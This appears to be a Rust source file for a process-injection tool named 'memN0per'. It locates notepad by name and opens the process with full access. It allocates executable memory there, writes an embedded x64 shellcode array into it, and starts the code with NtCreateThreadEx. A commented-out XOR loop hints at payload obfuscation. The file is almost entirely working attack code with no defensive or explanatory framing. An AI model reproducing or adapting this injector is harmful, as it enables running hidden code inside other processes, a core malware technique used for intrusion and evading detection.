use ntapi::ntpsapi::{NtOpenProcess, NtCreateThreadEx};
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory};
use sysinfo::{Pid, ProcessExt, System, SystemExt};
use std::default::Default;
use std::ffi::c_void;
use std::ptr::null_mut;
use ntapi::winapi::shared::ntdef::{OBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES, PHANDLE, HANDLE, POBJECT_ATTRIBUTES32, NTSTATUS, LARGE_INTEGER};
use ntapi::ntapi_base::{CLIENT_ID, PCLIENT_ID};
use ntapi::winapi::shared::ntstatus::STATUS_SUCCESS;
use ntapi::winapi::um::lmaccess::ACCESS_ALL;
use winapi::shared::ntstatus;
use winapi::um::winnt::{ACCESS_MASK, MEM_COMMIT, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MAXIMUM_ALLOWED};
use std::mem;
use ntapi::winapi::shared::basetsd::PSIZE_T;
use ntapi::ntobapi::NtWaitForSingleObject;
use ntapi::winapi::um::synchapi::WaitForSingleObject;

fn main() {
    println!(" ### memN0per ###");

    //Gets the process by name and ID. Returns process_id and process_name
    let process_id = get_process_by_name("notepad");

    println!("[+] Got PID: {}", process_id);

    //inject shellcode into the process
    unsafe
    {
        inject_shellcode(process_id);
    }
}

unsafe fn inject_shellcode(process_id: Pid) {
    println!("[+] Injecting shellcode");

    let mut oa = OBJECT_ATTRIBUTES::default();

    let mut process_handle = process_id as HANDLE;

    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };


    let mut status = NtOpenProcess(&mut process_handle, ACCESS_ALL, &mut oa, &mut ci);

    if (status != STATUS_SUCCESS) {
        println!("Error opening process: {}", status);
    }
    println!("{}",status);

    let mut shellcode = vec![0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
                             0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
                             0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
                             0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
                             0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
                             0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
                             0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
                             0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
                             0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
                             0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
                             0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                             0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
                             0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
                             0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                             0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
                             0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
                             0x85,0x04,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
                             0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x65,0x6c,
                             0x6c,0x6f,0x00,0x68,0x65,0x6c,0x6c,0x6f,0x00];

    //let mut shellcode = Vec::with_capacity(buf.len());
    //for x in &buf {
    //    shellcode.push(*x ^ 0xBE);
    //}

    println!("{:?}",shellcode);

    let mut shellcode_length = shellcode.len();

    println!("{}", shellcode_length);

    let handle = process_handle as *mut c_void;
    let mut base_address : *mut c_void = null_mut();
    status = NtAllocateVirtualMemory(handle, &mut base_address, 0, &mut shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


    if (status != STATUS_SUCCESS) {
        println!("Error allocating  memory to the target process: {}", status);
    }
    println!("{}",status);

    let mut bytes_written = 0;

    //Here
    let buffer = shellcode.as_mut_ptr() as *mut c_void;
    let buffer_length = shellcode.len();

    status = NtWriteVirtualMemory(handle, base_address, buffer, buffer_length, &mut bytes_written);

    println!("{}", bytes_written);

    if (status != STATUS_SUCCESS) {
        println!("Error writing shellcode to memory of the target process: {}", status);
    }
    println!("{}",status);

    let mut thread_handle : *mut c_void = null_mut();

    status = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, base_address, null_mut(), 0, 0, 0, 0, null_mut());

    if (status != STATUS_SUCCESS) {
        println!("Error failed to create remote thread: {}", status);
    }
    println!("{}",status);

    //WaitForSingleObject(thread_handle, 0xFFFFFFFF);
}

fn get_process_by_name(target_process: &str) -> (Pid) {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id = 0;

    for process in system.process_by_name(target_process) {
        //println!("{} {}", process.pid(), process.name());
        process_id = process.pid();
    }

    return process_id;
}